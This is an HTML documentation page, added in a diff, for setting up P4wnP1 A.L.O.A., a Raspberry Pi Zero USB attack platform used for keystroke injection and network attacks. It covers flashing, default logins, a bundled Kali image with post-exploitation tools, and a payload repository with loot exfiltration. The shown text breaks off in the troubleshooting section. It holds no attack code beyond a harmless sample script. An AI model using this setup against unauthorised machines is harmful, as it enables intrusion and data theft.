@@ -1,0 +1,1298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>P4wnP1 A.L.O.A. Documentation | Nerd or Geek?</title>
+    <link rel="icon" type="image/x-icon" href="../assets/img/favicons/favicon.ico?v=1">
+    <link rel="shortcut icon" type="image/x-icon" href="../assets/img/favicons/favicon.ico?v=1">
+    <link rel="stylesheet" href="../src/styles/main.css">
+    <link rel="stylesheet" href="../src/styles/docs.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Sample Scripts Popup Styles */
+        .scripts-popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .scripts-popup-overlay.active {
+            display: flex;
+        }
+
+        .scripts-popup {
+            background: var(--docs-bg);
+            border-radius: 12px;
+            max-width: 900px;
+            width: 100%;
+            max-height: 80vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .scripts-popup-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem;
+            border-bottom: 1px solid var(--docs-border);
+            background: var(--docs-bg-alt);
+        }
+
+        .scripts-popup-header h2 {
+            margin: 0;
+            font-size: 1.25rem;
+            color: var(--docs-text);
+        }
+
+        .scripts-popup-close {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: var(--docs-text-muted);
+            padding: 0.25rem;
+            transition: color 0.2s;
+        }
+
+        .scripts-popup-close:hover {
+            color: var(--docs-text);
+        }
+
+        .scripts-popup-body {
+            padding: 1.5rem;
+            overflow-y: auto;
+        }
+
+        .script-tabs {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .script-tab {
+            padding: 0.5rem 1rem;
+            border: 1px solid var(--docs-border);
+            background: var(--docs-bg);
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.875rem;
+            transition: all 0.2s;
+        }
+
+        .script-tab:hover {
+            background: var(--docs-accent-light);
+            border-color: var(--docs-accent);
+        }
+
+        .script-tab.active {
+            background: var(--docs-accent);
+            color: white;
+            border-color: var(--docs-accent);
+        }
+
+        .script-content {
+            display: none;
+        }
+
+        .script-content.active {
+            display: block;
+        }
+
+        .script-description {
+            margin-bottom: 1rem;
+            color: var(--docs-text-muted);
+        }
+
+        .script-code {
+            background: var(--docs-code-bg);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .script-code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.75rem 1rem;
+            background: rgba(0, 0, 0, 0.3);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .script-code-lang {
+            font-size: 0.75rem;
+            color: var(--docs-accent);
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .script-copy-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: var(--docs-code-text);
+            padding: 0.25rem 0.75rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: background 0.2s;
+        }
+
+        .script-copy-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .script-code pre {
+            margin: 0;
+            padding: 1rem;
+            overflow-x: auto;
+        }
+
+        .script-code code {
+            color: var(--docs-code-text);
+            font-family: 'Fira Code', 'Monaco', 'Consolas', monospace;
+            font-size: 0.875rem;
+            line-height: 1.6;
+        }
+
+        .open-scripts-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: linear-gradient(135deg, #8b5cf6 0%, #6d28d9 100%);
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .open-scripts-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgba(139, 92, 246, 0.4);
+        }
+
+        /* Accordion Styles */
+        .docs-accordion {
+            margin-top: 1rem;
+        }
+
+        .accordion-item {
+            border: 1px solid var(--docs-border);
+            border-radius: 8px;
+            margin-bottom: 0.5rem;
+            overflow: hidden;
+        }
+
+        .accordion-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 1.25rem;
+            background: var(--docs-bg-alt);
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .accordion-header:hover {
+            background: var(--docs-accent-light);
+        }
+
+        .accordion-header h4 {
+            margin: 0;
+            font-size: 1rem;
+            color: var(--docs-text);
+        }
+
+        .accordion-icon {
+            transition: transform 0.3s;
+            color: var(--docs-text-muted);
+        }
+
+        .accordion-item.active .accordion-icon {
+            transform: rotate(180deg);
+        }
+
+        .accordion-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+        }
+
+        .accordion-item.active .accordion-content {
+            max-height: 500px;
+        }
+
+        .accordion-body {
+            padding: 1rem 1.25rem;
+            border-top: 1px solid var(--docs-border);
+        }
+
+        /* Video Embed */
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            overflow: hidden;
+            border-radius: 12px;
+            margin-top: 1rem;
+        }
+
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-container">
+            <button class="sidebar-toggle" id="sidebarToggle" aria-label="Toggle Sidebar">
+                <i class="fas fa-bars"></i>
+            </button>
+            <a href="../index.html" class="logo-link">
+                <div class="logo-section">
+                    <img src="../assets/img/Logo-With-Name.png" alt="Nerd or Geek Logo" class="logo-img">
+                </div>
+            </a>
+            <nav class="header-nav">
+                <a href="../index.html" class="header-nav-link">Home</a>
+                <a href="../projects.html" class="header-nav-link active">Projects</a>
+            </nav>
+
+            <!-- Search Bar -->
+            <div class="search-container">
+                <input 
+                    type="text" 
+                    class="search-input" 
+                    id="searchInput" 
+                    placeholder="Search docs..."
+                    aria-label="Search"
+                >
+                <button class="search-button" id="searchButton" aria-label="Search Button">
+                    <i class="fas fa-search"></i>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <div class="docs-wrapper">
+        <!-- Sidebar Navigation -->
+        <aside class="docs-sidebar">
+            <nav class="docs-nav">
+                <div class="docs-nav-header">
+                    <h3>P4wnP1 A.L.O.A.</h3>
+                </div>
+                <ul class="docs-toc">
+                    <li><a href="#overview" class="docs-link">Overview</a></li>
+                    <li><a href="#features" class="docs-link">Features</a></li>
+                    <li><a href="#estimated-time" class="docs-link">Estimated Time</a></li>
+                    <li><a href="#prerequisites" class="docs-link">Prerequisites</a></li>
+                    <li><a href="#installation" class="docs-link">Installation Guide</a></li>
+                    <li><a href="#web-interface" class="docs-link">Web Interface</a></li>
+                    <li><a href="#basic-usage" class="docs-link">Basic Usage</a></li>
+                    <li><a href="#sample-scripts" class="docs-link">Sample Scripts</a></li>
+                    <li><a href="#custom-image" class="docs-link">Custom Kali Image</a></li>
+                    <li><a href="#payloads-repo" class="docs-link">Payloads Repository</a></li>
+                    <li><a href="#security-notice" class="docs-link">Security Notice</a></li>
+                    <li><a href="#troubleshooting" class="docs-link">Troubleshooting</a></li>
+                    <li><a href="#resources" class="docs-link">Resources</a></li>
+                </ul>
+            </nav>
+        </aside>
+
+        <!-- Main Documentation Content -->
+        <main class="docs-main">
+            <!-- Breadcrumb -->
+            <div class="docs-breadcrumb">
+                <a href="../index.html">Home</a>
+                <span class="separator">/</span>
+                <a href="../projects.html">Projects</a>
+                <span class="separator">/</span>
+                <span class="current">P4wnP1 A.L.O.A.</span>
+            </div>
+
+            <!-- Hero Section -->
+            <section class="docs-hero">
+                <div class="docs-hero-content">
+                    <h1 class="docs-title">P4wnP1 A.L.O.A.</h1>
+                    <p class="docs-subtitle">Highly customizable USB attack platform for Raspberry Pi Zero & Zero W</p>
+                    <div class="docs-meta">
+                        <span class="docs-badge">Tutorial</span>
+                        <span class="docs-badge">Raspberry Pi</span>
+                        <span class="docs-badge">Offensive Security</span>
+                        <span class="docs-badge">USB HID</span>
+                    </div>
+                </div>
+                <div class="docs-hero-image">
+                    <img src="../assets/img/projects/p4wnp1.png" alt="P4wnP1 A.L.O.A. logo">
+                </div>
+            </section>
+
+            <!-- Content Sections -->
+            <article class="docs-content">
+                <!-- Overview -->
+                <section id="overview" class="docs-section">
+                    <h2 class="docs-heading">Overview</h2>
+                    <p>
+                        <strong>P4wnP1 A.L.O.A.</strong> (A Little Offensive Application) is an open-source, highly customizable USB attack platform designed for the Raspberry Pi Zero and Zero W. It transforms your tiny Pi into a powerful security testing tool capable of emulating various USB devices.
+                    </p>
+                    
+                    <h3>Key Capabilities</h3>
+                    <div class="docs-grid-2">
+                        <div class="docs-card">
+                            <h4><i class="fas fa-keyboard"></i> USB HID Emulation</h4>
+                            <p>Emulate keyboards, mice, and composite devices for automated input attacks and payload delivery.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-network-wired"></i> USB Ethernet</h4>
+                            <p>Create virtual network interfaces using RNDIS (Windows) and ECM (macOS/Linux) for network-based attacks.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-code"></i> Payload Execution</h4>
+                            <p>Execute automated scripts and payloads with precise timing and conditional logic.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-globe"></i> Web Configuration</h4>
+                            <p>Full web-based interface for live configuration, payload management, and device control.</p>
+                        </div>
+                    </div>
+
+                    <h3>Typical Use Cases</h3>
+                    <ul>
+                        <li><strong>Security Research:</strong> Test USB-based attack vectors and defenses</li>
+                        <li><strong>Red Team Testing:</strong> Physical penetration testing and social engineering assessments</li>
+                        <li><strong>USB Device Emulation Labs:</strong> Educational environments for learning USB security</li>
+                        <li><strong>Automation:</strong> Automated keyboard input for repetitive tasks</li>
+                    </ul>
+
+                    <h3>Supported Hardware</h3>
+                    <div class="docs-callout docs-callout-info">
+                        <i class="fas fa-microchip"></i>
+                        <div>
+                            <strong>Compatible Devices:</strong> Raspberry Pi Zero and Raspberry Pi Zero W only. The standard Raspberry Pi models (3, 4, 5) are not supported due to USB OTG requirements.
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Features -->
+                <section id="features" class="docs-section">
+                    <h2 class="docs-heading">Features</h2>
+                    <div class="docs-grid-3">
+                        <div class="docs-card">
+                            <h4><i class="fas fa-puzzle-piece"></i> Modular USB Gadget</h4>
+                            <p>Flexible USB gadget framework supporting multiple device types simultaneously.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-desktop"></i> Web UI</h4>
+                            <p>Intuitive web interface for real-time configuration and monitoring.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-scroll"></i> Scriptable Payloads</h4>
+                            <p>JavaScript-based payload system with full access to device capabilities.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-shield-alt"></i> Network Attacks</h4>
+                            <p>Built-in support for network interception and manipulation.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-eye-slash"></i> Headless Operation</h4>
+                            <p>Runs completely headless - no monitor, keyboard, or mouse required.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-users"></i> Community Payloads</h4>
+                            <p>Access community-maintained payloads and extensions.</p>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Estimated Time -->
+                <section id="estimated-time" class="docs-section">
+                    <h2 class="docs-heading">Estimated Setup Time</h2>
+                    <div class="docs-callout docs-callout-info">
+                        <i class="fas fa-clock"></i>
+                        <div>
+                            <strong>15–30 minutes</strong>
+                            <ul style="margin: 0.5rem 0 0 0; padding-left: 1.25rem;">
+                                <li>Image download: 5-10 minutes (depending on connection)</li>
+                                <li>Flashing SD card: 5-10 minutes</li>
+                                <li>First boot and access: 2-5 minutes</li>
+                            </ul>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Prerequisites -->
+                <section id="prerequisites" class="docs-section">
+                    <h2 class="docs-heading">Prerequisites</h2>
+                    <p>Ensure you have all necessary hardware and software before starting the installation.</p>
+                    
+                    <div class="docs-grid-2">
+                        <div class="docs-card">
+                            <h3><i class="fas fa-microchip"></i> Required Hardware</h3>
+                            <ul>
+                                <li>Raspberry Pi Zero or Raspberry Pi Zero W</li>
+                                <li>MicroSD card (8 GB or larger recommended)</li>
+                                <li>SD card reader (USB or built-in)</li>
+                                <li>Micro-USB cable capable of data + power</li>
+                            </ul>
+                        </div>
+                        <div class="docs-card">
+                            <h3><i class="fas fa-laptop"></i> Required Software</h3>
+                            <ul>
+                                <li>Raspberry Pi Imager (or balenaEtcher)</li>
+                                <li>A computer running Windows, macOS, or Linux</li>
+                                <li>Web browser for accessing the interface</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="docs-callout docs-callout-warning">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <div>
+                            <strong>Important:</strong> Use the USB <strong>data port</strong> on the Pi Zero, not the power-only port. The data port is the one closest to the center of the board.
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Installation Guide -->
+                <section id="installation" class="docs-section">
+                    <h2 class="docs-heading">Installation Guide</h2>
+                    <p>Follow these steps to set up P4wnP1 A.L.O.A. on your Raspberry Pi Zero.</p>
+                    
+                    <div class="docs-steps">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>Obtain the Image</h4>
+                                <p>Download the latest P4wnP1 A.L.O.A. image from the official GitHub Releases page.</p>
+                                <a href="https://github.com/RoganDawes/P4wnP1_aloa/releases" target="_blank" class="docs-link">
+                                    <i class="fas fa-download"></i> Download from GitHub Releases
+                                </a>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>Flash the SD Card</h4>
+                                <p>Use Raspberry Pi Imager or balenaEtcher to flash the downloaded image to your microSD card.</p>
+                                <ol>
+                                    <li>Open Raspberry Pi Imager</li>
+                                    <li>Click "Choose OS" → "Use custom" and select the P4wnP1 image</li>
+                                    <li>Select your SD card as the storage device</li>
+                                    <li>Click "Write" and wait for completion</li>
+                                    <li>Safely eject the SD card after flashing</li>
+                                </ol>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">
+                                <h4>Hardware Setup</h4>
+                                <p>Prepare your Raspberry Pi Zero for first boot.</p>
+                                <ol>
+                                    <li>Insert the microSD card into the Raspberry Pi Zero</li>
+                                    <li>Connect the Pi to your computer using the <strong>USB data port</strong> (not the power-only port)</li>
+                                </ol>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">4</div>
+                            <div class="step-content">
+                                <h4>First Boot</h4>
+                                <p>Allow the device to boot and configure itself.</p>
+                                <ul>
+                                    <li>The Pi will boot and initialize (allow 1-2 minutes)</li>
+                                    <li>The device will enumerate as a USB HID and/or USB network device</li>
+                                    <li>Your computer should detect a new network adapter</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">5</div>
+                            <div class="step-content">
+                                <h4>Access the Device</h4>
+                                <p>Connect to P4wnP1 using the default credentials.</p>
+                                <div class="docs-code-block">
+                                    <div class="code-header">
+                                        <span class="code-lang">Default Credentials</span>
+                                    </div>
+                                    <pre><code>Username: pi
+Password: raspberry
+Web UI: http://172.16.0.1:8000 (or http://172.24.0.1:8000)</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Web Interface -->
+                <section id="web-interface" class="docs-section">
+                    <h2 class="docs-heading">Web Interface Overview</h2>
+                    <p>The P4wnP1 web interface provides complete control over all device functions.</p>
+                    
+                    <div class="docs-grid-2">
+                        <div class="docs-card">
+                            <h4><i class="fas fa-tachometer-alt"></i> Dashboard</h4>
+                            <p>Overview of current device status, active gadgets, and quick actions.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-usb"></i> USB Gadget Settings</h4>
+                            <p>Configure USB device emulation modes (HID, network, mass storage).</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-file-code"></i> Payload Management</h4>
+                            <p>Create, edit, and deploy HIDScripts and trigger payloads.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-wifi"></i> Network Settings</h4>
+                            <p>Configure WiFi (on Zero W), USB Ethernet, and network triggers.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-terminal"></i> Logs & Status</h4>
+                            <p>View system logs, payload execution results, and debug information.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-cog"></i> System Settings</h4>
+                            <p>Manage templates, backup/restore configurations, and system updates.</p>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Basic Usage -->
+                <section id="basic-usage" class="docs-section">
+                    <h2 class="docs-heading">Basic Usage</h2>
+                    
+                    <h3>Enabling HID Keyboard Payloads</h3>
+                    <ol>
+                        <li>Navigate to the web interface at <code>http://172.16.0.1:8000</code></li>
+                        <li>Go to <strong>USB Settings</strong> and ensure HID Keyboard is enabled</li>
+                        <li>Navigate to <strong>HIDScript</strong> section</li>
+                        <li>Select or create a payload script</li>
+                        <li>Click <strong>Run</strong> to execute the payload</li>
+                    </ol>
+
+                    <h3>Running a Sample Payload</h3>
+                    <div class="docs-code-block">
+                        <div class="code-header">
+                            <span class="code-lang">JavaScript (HIDScript)</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code>// Simple Hello World payload
+layout("us");               // Set keyboard layout
+typingSpeed(100, 150);      // Random delay between keystrokes
+
+press("GUI r");             // Open Run dialog (Windows)
+delay(500);
+type("notepad");
+press("ENTER");
+delay(1000);
+type("Hello from P4wnP1!");</code></pre>
+                    </div>
+
+                    <h3>Switching USB Modes</h3>
+                    <p>P4wnP1 supports multiple USB gadget configurations:</p>
+                    <ul>
+                        <li><strong>HID Only:</strong> Keyboard/mouse emulation</li>
+                        <li><strong>RNDIS + HID:</strong> Network adapter + keyboard (Windows)</li>
+                        <li><strong>ECM + HID:</strong> Network adapter + keyboard (macOS/Linux)</li>
+                        <li><strong>Mass Storage:</strong> USB drive emulation</li>
+                    </ul>
+
+                    <h3>Saving Configurations</h3>
+                    <p>Use the <strong>Templates</strong> feature to save and load complete device configurations including USB settings, WiFi configuration, and trigger actions.</p>
+                </section>
+
+                <!-- Sample Scripts -->
+                <section id="sample-scripts" class="docs-section">
+                    <h2 class="docs-heading">Sample Scripts</h2>
+                    <p>Get started quickly with these ready-to-use HIDScript examples. Click the button below to view sample payloads.</p>
+                    
+                    <button class="open-scripts-btn" onclick="openScriptsPopup()">
+                        <i class="fas fa-code"></i> View Sample Scripts
+                    </button>
+                </section>
+
+                <!-- Custom Kali Image -->
+                <section id="custom-image" class="docs-section">
+                    <h2 class="docs-heading">Custom Kali Linux Image</h2>
+                    <p>For a pre-configured, ready-to-use experience, check out NightRang3r's custom P4wnP1 Kali Linux 2023.1 image for Raspberry Pi Zero W.</p>
+                    
+                    <div class="docs-callout docs-callout-info">
+                        <i class="fas fa-sd-card"></i>
+                        <div>
+                            <strong>Requirement:</strong> A 16GB SD card is required for both versions of the image. The image is compressed with xz - use 7zip to extract it.
+                        </div>
+                    </div>
+
+                    <h3>Image Versions</h3>
+                    <div class="docs-grid-2">
+                        <div class="docs-card">
+                            <h4><i class="fas fa-feather"></i> Lite Version</h4>
+                            <p><code>P4wnP1-aloha-kali-linux-2023.1-raspberry-pi-zero-w-by-NightRang3r-1.1.0-lite.img.xz</code></p>
+                            <p>Scripts are included but not installed or deployed. You'll need to manually copy them to the correct directories and setup triggers in the P4wnP1 UI.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-box-full"></i> Full Version</h4>
+                            <p><code>P4wnP1-aloha-kali-linux-2023.1-raspberry-pi-zero-w-by-NightRang3r-1.1.0.img.xz</code></p>
+                            <p>All scripts, Raw HID scripts, and most HID scripts are included, installed, and configured. Ready to use immediately!</p>
+                        </div>
+                    </div>
+
+                    <h3>Key Features</h3>
+                    <div class="docs-grid-3">
+                        <div class="docs-card">
+                            <h4><i class="fas fa-cog"></i> Boot Config</h4>
+                            <p>Updated boot.txt and config.txt for P4wnP1 functionality.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-tools"></i> Included Tools</h4>
+                            <p>Responder, Metasploit, Impacket, Nmap, Aircrack-ng, MDK4, MSFPC, and more.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fab fa-python"></i> Python Ready</h4>
+                            <p>Python 2 & 3 with spidev, Pillow, luma.lcd, luma.oled, RPi.GPIO pre-installed.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-desktop"></i> LCD/OLED Support</h4>
+                            <p>Modified LCD and OLED menu repositories included for hat displays.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-expand-arrows-alt"></i> Easy Expansion</h4>
+                            <p>raspi-config included for easy filesystem expansion.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-folder-open"></i> Kali Binaries</h4>
+                            <p>Kali Windows binaries included for post-exploitation.</p>
+                        </div>
+                    </div>
+
+                    <h3>Directory Structure</h3>
+                    <div class="docs-code-block">
+                        <div class="code-header">
+                            <span class="code-lang">File Paths</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code># HID Scripts location
+/usr/local/P4wnP1/HIDScripts
+
+# Shell scripts location
+/usr/local/P4wnP1/scripts
+
+# Loot directory (accessible via browser)
+/usr/local/P4wnP1/www/loot
+# Browser access: http://172.XX.0.1:8000/loot/</code></pre>
+                    </div>
+
+                    <h3>Custom Image Installation</h3>
+                    <div class="docs-steps">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>Download the Image</h4>
+                                <p>Get the image from one of these sources:</p>
+                                <ul>
+                                    <li><a href="https://drive.google.com/drive/folders/14XCb1sHFjzZa7OnzNZRt5AeTbEyZlZGf?usp=sharing" target="_blank">Google Drive</a></li>
+                                    <li><a href="https://mega.nz/folder/UWgClaID#IlDFij3ckSTR4EqTlzDh_Q" target="_blank">MEGA</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>Extract & Flash</h4>
+                                <p>Extract the .xz file with 7zip, then flash to your SD card using Raspberry Pi Imager or balenaEtcher.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">
+                                <h4>Connect to the Device</h4>
+                                <div class="docs-grid-2">
+                                    <div class="docs-card">
+                                        <h4>USB Gadget Mode</h4>
+                                        <ul>
+                                            <li>SSH: <code>172.16.0.1:22</code></li>
+                                            <li>Web UI: <code>http://172.16.0.1:8000</code></li>
+                                        </ul>
+                                    </div>
+                                    <div class="docs-card">
+                                        <h4>WiFi AP Mode</h4>
+                                        <ul>
+                                            <li>SSID: <code>💥🖥💥 Ⓟ➃ⓌⓃ🅟❶</code></li>
+                                            <li>SSH: <code>172.24.0.1:22</code></li>
+                                            <li>Web UI: <code>http://172.24.0.1:8000</code></li>
+                                            <li>WiFi Key: <code>MaMe82-P4wnP1</code></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                                <p><strong>Credentials:</strong> <code>root:toor</code></p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">4</div>
+                            <div class="step-content">
+                                <h4>Expand Filesystem</h4>
+                                <p>Run the following command and reboot to use the full SD card size:</p>
+                                <div class="docs-code-block">
+                                    <div class="code-header">
+                                        <span class="code-lang">Bash</span>
+                                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                    </div>
+                                    <pre><code>raspi-config --expand-rootfs
+sudo reboot</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">5</div>
+                            <div class="step-content">
+                                <h4>LCD/OLED Setup (Optional)</h4>
+                                <p>If you have a display hat, navigate to the corresponding directory and run the installer:</p>
+                                <div class="docs-code-block">
+                                    <div class="code-header">
+                                        <span class="code-lang">Bash</span>
+                                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                    </div>
+                                    <pre><code>cd /root/P4wnP1_ALOA_LCD_MENU  # or OLED_MENU_V2
+./install.sh</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">6</div>
+                            <div class="step-content">
+                                <h4>Setup Startup Menu</h4>
+                                <p>Create a new trigger action when service starts:</p>
+                                <ol>
+                                    <li>Go to P4wnP1 Web UI → Trigger Actions</li>
+                                    <li>Add new trigger: "When service starts"</li>
+                                    <li>Action: Run bash script</li>
+                                    <li>Select: <code>/usr/local/P4wnP1/scripts/runmenu.sh</code></li>
+                                    <li>Save to startup template</li>
+                                </ol>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Payloads Repository -->
+                <section id="payloads-repo" class="docs-section">
+                    <h2 class="docs-heading">P4wnP1-A.L.O.A. Payloads Repository</h2>
+                    <p>A comprehensive collection of tested and verified scripts for Windows, macOS, and Raw HID attacks. These payloads are adapted to work with the custom P4wnP1 image.</p>
+                    
+                    <div class="docs-callout docs-callout-success">
+                        <i class="fas fa-check-circle"></i>
+                        <div>
+                            <strong>Pre-included:</strong> This repository is pre-included in the root directory of the custom image. Run <code>git pull</code> occasionally to get the latest updates.
+                        </div>
+                    </div>
+
+                    <h3>Payload Categories</h3>
+                    <div class="docs-grid-3">
+                        <div class="docs-card">
+                            <h4><i class="fab fa-windows"></i> Windows Scripts</h4>
+                            <p>PowerShell and batch scripts for Windows targets.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fab fa-apple"></i> macOS Scripts</h4>
+                            <p>Shell scripts and AppleScript payloads for OSX.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-keyboard"></i> HIDScripts</h4>
+                            <p>JavaScript-based keyboard injection scripts.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-bolt"></i> Raw HID Attacks</h4>
+                            <p>Low-level HID device attack scripts.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-wifi"></i> Network Attacks</h4>
+                            <p>RNDIS/ECM based network exploitation.</p>
+                        </div>
+                        <div class="docs-card">
+                            <h4><i class="fas fa-folder-plus"></i> Loot Collection</h4>
+                            <p>Auto-exfiltration to browsable loot directory.</p>
+                        </div>
+                    </div>
+
+                    <div class="docs-callout docs-callout-warning">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <div>
+                            <strong>Compatibility Note:</strong> If using this repository with a different image, you may need to make adjustments to the scripts for compatibility. Check the comments inside each file for usage and requirements.
+                        </div>
+                    </div>
+
+                    <h3>Quick Update</h3>
+                    <div class="docs-code-block">
+                        <div class="code-header">
+                            <span class="code-lang">Bash</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code># Navigate to payloads directory
+cd /root/P4wnP1-A.L.O.A.-Payloads
+
+# Pull latest updates
+git pull</code></pre>
+                    </div>
+                </section>
+
+                <!-- Security Notice -->
+                <section id="security-notice" class="docs-section">
+                    <h2 class="docs-heading">Security & Legal Notice</h2>
+                    <div class="docs-callout docs-callout-warning">
+                        <i class="fas fa-gavel"></i>
+                        <div>
+                            <strong>Important Legal Disclaimer</strong>
+                            <p style="margin-top: 0.5rem;">P4wnP1 is intended for <strong>authorized security testing and educational use only</strong>. Unauthorized access to computer systems is illegal in most jurisdictions.</p>
+                            <ul style="margin-top: 0.5rem; padding-left: 1.25rem;">
+                                <li>Only use on systems you own or have explicit permission to test</li>
+                                <li>Users are responsible for complying with all applicable laws and policies</li>
+                                <li>Document all testing activities and obtain written authorization</li>
+                                <li>The developers and this guide assume no liability for misuse</li>
+                            </ul>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Troubleshooting -->
+                <section id="troubleshooting" class="docs-section">
+                    <h2 class="docs-heading">Troubleshooting</h2>
+                    <p>Common issues and their solutions.</p>
+                    
+                    <div class="docs-accordion">
+                        <div class="accordion-item">
+                            <div class="accordion-header" onclick="toggleAccordion(this)">
+                                <h4>Device not detected over USB</h4>
+                                <i class="fas fa-chevron-down accordion-icon"></i>
+                            </div>
+                            <div class="accordion-content">
+                                <div class="accordion-body">
+                                    <ul>
+                                        <li>Ensure you're using the <strong>data port</strong>, not the power-only port</li>
+                                        <li>Try a different USB cable (some are power-only)</li>
+                                        <li>Allow 1-2 minutes for initial boot</li>
+                                        <li>Check Device Manager (Windows) or System Report (macOS) for the device</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="accordion-item">
+                            <div class="accordion-header" onclick="toggleAccordion(this)">
+                                <h4>Web UI not reachable</h4>
+                                <i class="fas fa-chevron-down accordion-icon"></i>
+                            </div>
+                            <div class="accordion-content">
+                                <div class="accordion-body">
+                                    <ul>
+                                        <li>Ensure the USB network adapter is properly configured</li>
+                                        <li>Try both <code>http://172.16.0.1:8000</code> and <code>http://172.24.0.1:8000</code></li>
